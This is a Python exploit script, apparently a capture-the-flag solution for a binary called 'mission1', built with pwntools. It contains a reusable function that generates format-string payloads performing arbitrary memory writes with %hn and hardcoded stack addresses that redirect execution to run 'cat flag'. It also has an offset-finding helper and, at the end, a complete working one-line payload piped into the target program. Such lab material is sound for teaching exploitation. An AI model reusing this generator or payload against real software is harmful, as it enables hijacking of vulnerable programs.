from pwn import *


#code
def create_format_string(offset, tuples, initial_bytes, final_bytes):
    if(len(initial_bytes)%4!=0):
        assert "intial space nope"

    chunks = []

    for (where, what) in tuples:
        high = what >> 16
        low = what & 0xffff

        if high>low:
            chunks.append((low, where+2))
            chunks.append((high, where))
        else:
            chunks.append((low, where))
            chunks.append((high, where+2))

    chunks = sorted(chunks, key=lambda x: x[0])

    for (half, where) in chunks:
        print("half: ", hex(half), "where: ", hex(where))

    str_format=b""
    str_format+=initial_bytes

    #chunks [(half where)]

    for (_,where) in chunks:
        str_format+=p32(where)
    
    printed = len(str_format)

    real_offset = offset + int(len(initial_bytes)/4)
    
    for (i, (half, _)) in enumerate(chunks):
        str_format+=f"%{half-printed}c".encode()
        str_format+=f"%{real_offset+i}$hn".encode()
        printed = half

    str_format+=final_bytes

    return str_format


jump_cat = (0xffffdd5c, 0x08048a00) #where, what
arg_flag = (0xffffdd64, 0xffffdd8c )
offset = 51 #the offset is the number of address from the initial string. Look at code below
happy_art = b"flag;( o.o )"

format_string = create_format_string(offset=offset, tuples=[jump_cat, arg_flag], initial_bytes=happy_art, final_bytes=b"")
print(format_string)


# this challenge is a format_string, I created a function the builds the format string generally. 
# so it was easy the use it as I wanted


# code to find the offset

def build_offset():
    for j in range(0,11):
        y=""
        for i in range(15*j,15*(j+1) ):
            y+=f" %{i}$x"
        
        print('AAAA ( o.o )'+y+"\n")
    
    #the offset is the number related to address 0x41414141


#final working string


# (python3 -c "import sys; sys.stdout.buffer.write(b'2\nflag;( o.o )\x5e\xdd\xff\xff\x5c\xdd\xff\xff\x64\xdd\xff\xff\x66\xdd\xff\xff%2024c%54\$hn%33276c%55\$hn%21388c%56\$hn%8819c%57\$hn\n3\n')"; cat -) | env -i "PWD=/home/m226002/mission1" SHLVL=0 /home/m226002/mission1/mission1
